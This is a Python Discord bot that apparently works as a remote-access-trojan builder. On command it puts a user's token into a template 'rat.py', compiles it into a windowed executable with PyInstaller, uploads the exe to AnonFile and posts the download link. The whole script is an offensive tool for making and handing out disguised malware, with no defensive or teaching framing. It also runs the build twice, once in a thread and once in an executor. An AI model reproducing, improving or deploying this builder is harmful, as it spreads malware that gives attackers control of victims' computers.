import discord
from discord.ext import commands
import threading
from anonfile import AnonFile
import shutil
from pathlib import Path
import os

lock = threading.Lock()

def upload(filepath):
    file_up = AnonFile()
    up = file_up.upload(filepath)
    return str(up.url.geturl())

def gen(token, lock):
    with lock:
        src = r'rat.py'
        dest = 'hi.py'
        path = shutil.copyfile(src, dest)
        file = Path(r'hi.py')
        data = file.read_text()
        sr = '#Enteer'
        data = data.replace(sr,token)
        file.write_text(data)
        os.system("python -m PyInstaller --onefile --windowed --hidden-import=discord hi.py")
        url = upload(r'dist/hi.exe')
    return url

async def generate_token(ctx, tkn: str):
    t2 = threading.Thread(target=gen, args=(tkn, lock,), daemon=True)
    t2.start()
    url = await bot.loop.run_in_executor(None, gen, tkn, lock)
    await ctx.send(url)

bot = commands.Bot(command_prefix="#",intents=discord.Intents.all())
bot.command(name="gen")(generate_token)

bot.run("tkn")
